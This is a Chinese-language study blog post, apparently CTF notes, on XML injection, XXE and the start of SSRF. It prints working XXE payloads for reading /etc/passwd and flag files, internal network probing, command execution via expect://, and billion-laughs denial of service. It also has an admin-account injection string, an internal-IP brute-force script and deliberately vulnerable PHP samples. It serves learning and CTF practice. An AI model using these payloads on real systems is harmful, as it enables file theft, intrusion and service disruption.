<p><img src="/img/lazy.gif" data-original="xml2.png" alt=""></p>
<h3 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h3><p>XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p>
<p>通过闭合前面的尖括号，来达到注入的效果：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manager</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">admin</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">admin</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>root<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>root<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manager</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过拼凑</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin <span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">admin</span>&gt;</span><span class="tag">&lt;<span class="name">admin</span> <span class="attr">id</span>=<span class="string">&quot;3&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>hack<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>hacker<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>来闭合前面的账号密码，然后再创建一个新的账号（管理员权限 ），这样就无需知道原本的管理员密码  </p>
<h3 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h3><p><strong>XML External Entity Injection</strong><br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害</p>
<h4 id="常见环境"><a href="#常见环境" class="headerlink" title="常见环境"></a>常见环境</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xmlfile</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();                     <span class="comment">// 初始化XML解释器</span></span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>);                    <span class="comment">// 加载输入的XML内容</span></span><br><span class="line"><span class="variable">$xml</span>=<span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);            <span class="comment">// 获取XML文档的节点，失败返回FALSE</span></span><br><span class="line"><span class="variable">$xxe</span>=<span class="variable">$xml</span>-&gt;xxe;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;<span class="subst">$xxe</span> \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试代码：</p>
<p>用POST传入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;    // 这里也可以指定什么盘里的内容，用绝对路径即可</span><br><span class="line">]&gt;</span><br><span class="line">&lt;xml&gt;</span><br><span class="line">&lt;xxe&gt;&amp;file;&lt;/xxe&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure>
<p>即可成功访问/etc/passwd文件</p>
<h4 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h4><p>用以下payload即可访问内网端口的内部信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.100:80&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<p>如果实在Linux下（这里读取IP地址）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://ifconfig&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<h4 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [ </span><br><span class="line">	&lt;!ELEMENT root (#PCDATA)&gt;</span><br><span class="line">	&lt;!ENTITY lol &quot;lollollollollollollollollollollollollollollollollollollollollollollollollollollollollollol\n&quot;&gt;</span><br><span class="line">	&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;lol6;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<p>通过定义多层递归引用的实体（变量）让解析的内容以及时间以指数级增长，以实现DDos攻击的效果</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p><strong>php文件读取</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>file协议</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">XXE</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;XXE;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">        123</span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>SVG</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;要读取的文件路径&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  		<span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>过滤System，Public</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">xml</span> <span class="string">&quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %xml;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag.txt&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">core</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>（用双重编码绕过）</p>
<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18894779">第三届黄河流域公安院校网络安全技能挑战赛 web 全解 - LamentXU - 博客园</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/F12-blog/p/18119406">利用BCEL字节码构造内存马 - F12~ - 博客园</a></p>
<p>里面的上传XML文件进行RCE</p>
<h4 id="BUUCTF在线评测-Fake-XML-CookBOOK"><a href="#BUUCTF在线评测-Fake-XML-CookBOOK" class="headerlink" title="BUUCTF在线评测 Fake XML CookBOOK"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NCTF2019]Fake XML cookbook">BUUCTF在线评测</a> Fake XML CookBOOK</h4><p>用bp抓包账号密码页面，发现是XML结构，且可以看到请求与响应包的携带的数据都是XML格式，并且返回包中的msg标签值与请求包中的username标签值相同，故尝试使用XXE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY XXE SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;username&gt;</span><br><span class="line">        &amp;XXE;</span><br><span class="line">    &lt;/username&gt;</span><br><span class="line">    &lt;password&gt;</span><br><span class="line">        123</span><br><span class="line">    &lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<h4 id="题目-MoeCTF-2025-10-revenge"><a href="#题目-MoeCTF-2025-10-revenge" class="headerlink" title="题目 - MoeCTF 2025 10_revenge"></a><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/games/22/challenges?challenge=929">题目 - MoeCTF 2025</a> 10_revenge</h4><p>上来随便输入一点可以看到报错信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML(): Start tag expected, &#x27;&amp;lt;&#x27; not found in Entity, line: 1 in &lt;b&gt;/var/www/html/chapter10.php&lt;/b&gt; on line &lt;b&gt;17&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;阵枢&gt;引魂玉&lt;/阵枢&gt;</span><br><span class="line">&lt;解析&gt;未定义&lt;/解析&gt;</span><br><span class="line">&lt;输出&gt;未定义&lt;/输出&gt;</span><br></pre></td></tr></table></figure>
<p>这看起来就是让我们输入XML文档，然后我们看到，有解析和输出标签，不如就用这两个包裹，就有了以下的EXP：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY XXE SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;输出&gt;</span><br><span class="line">        &amp;XXE;</span><br><span class="line">    &lt;/输出&gt;</span><br><span class="line">    &lt;解析&gt;</span><br><span class="line">        123</span><br><span class="line">    &lt;/解析&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- </span><br><span class="line">&lt;阵枢&gt;引魂玉&lt;/阵枢&gt;</span><br><span class="line">&lt;解析&gt;</span><br><span class="line">        123</span><br><span class="line">    &lt;/解析&gt;</span><br><span class="line">&lt;输出&gt;</span><br><span class="line">        flag：moectf&#123;G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l&#125;</span><br><span class="line">    &lt;/输出&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<h4 id="BUUCTF在线评测-True-XML-Cookbook"><a href="#BUUCTF在线评测-True-XML-Cookbook" class="headerlink" title="BUUCTF在线评测 True XML Cookbook"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NCTF2019]True XML cookbook">BUUCTF在线评测</a> True XML Cookbook</h4><p>跟上题同理，但是发现没有/flag文件，且/etc/passwd能正常访问</p>
<p>这里学习到一个点，flag可能存在于内网主机上，我们需要通过XXE对内网进行探测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY XXE SYSTEM &quot;file:///proc/net/fib_trie&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;username&gt;</span><br><span class="line">        &amp;XXE;</span><br><span class="line">    &lt;/username&gt;</span><br><span class="line">    &lt;password&gt;</span><br><span class="line">        123</span><br><span class="line">    &lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<p>然后找到可疑IP网段进行爆破</p>
<p><img src="/img/lazy.gif" data-original="xml3.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line">url=<span class="string">&quot;http://7935d298-d150-4321-be51-0ba6da571003.node5.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line">rawPayload=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.166.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;payload1;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;23&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    payload=rawPayload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#payload=rawPayload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="built_in">format</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.text,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>最近刷题时经常有看到SSRF，不如趁机补充一下（本来我还想水一下的）</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF - FreeBuf网络安全行业门户</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_49422880/article/details/117166929#:~:text=SSRT(Server-Side Request Forgery，服务器端请求伪造">CTFHUB—SSRF详解_ctfhub ssrf-CSDN博客</a>，就是攻击者利用服务器能访问其他的服务器的功能，通过自己的构造服务器请求来攻击与外界不相连接的内网，我们知道内网与外网是不相通的，所以利用这)</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/itbsl/p/9828776.html">CGI 和 FastCGI 协议的运行原理 - itbsl - 博客园</a></p>
<p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong> 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，一般来说SSRF是让网站执行链接来达到攻击内网或者访问特定文件（服务端发起，所以它能够请求到相连的内部系统），形成原因大都是由于服务端提供了从其他服务器下载资料的功能或者是访问其他网站的功能而没有对目标地址进行过滤和限制（指定 URL 地址获取网页文本内容，加载指定地址的图片，下载…..）</p>
<p><img src="/img/lazy.gif" data-original="ssrf1.png" alt=""></p>
<p>SSRF主要是由于一些危险函数（<code>file_get_contents()</code>  <code>readfile()</code> <code>fsockopen()</code> <code>curl_exec()</code> <code>SoapClient</code>…..）与危险协议（<code>file://</code> <code>gopher</code> <code>dict</code>）产生的</p>
<h3 id="FASTCGI"><a href="#FASTCGI" class="headerlink" title="FASTCGI"></a>FASTCGI</h3><ul>
<li>FastCGI 进程管理器启动时会创建一个 主（Master） 进程和多个 CGI 解释器进程（Worker 进程），然后等待 Web 服务器的连接</li>
<li>Web 服务器接收 HTTP 请求后，将 CGI 报文通过 套接字（UNIX 或 TCP Socket）进行通信，将环境变量和请求数据写入标准输入,转发到 CGI 解释器进程</li>
<li>CGI 解释器进程完成处理后将标准输出和错误信息从同一连接返回给 Web 服务器</li>
<li>CGI 解释器进程等待下一个 HTTP 请求的到来</li>
</ul>
<h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><p><strong>file_get_contents() 与 readfile()</strong></p>
<p>从函数字面上看，就是读取文件然后输出，类似代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>像这种没做任何过滤和限制的源码，直接输入?url=../../../../../etc/passwd即可读取根目录文件</p>
<p><strong>fsockopen()</strong></p>
<p>用于打开一个网络连接或者一个 Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定 url 数据的获取</p>
<p>基本语法 <code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>，参数分别为主机名/IP地址、端口、错误号（可选）、存储错误描述（可选）、设置连接超时时间（可选）。该函数会使用 socket 跟服务器建立 tcp 连接，进行传输原始数据。 fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用<code>fgets()，fgetss()，fwrite()，fclose()，feof()</code>如果调用失败，将返回false</p>
<p>类似代码：</p>
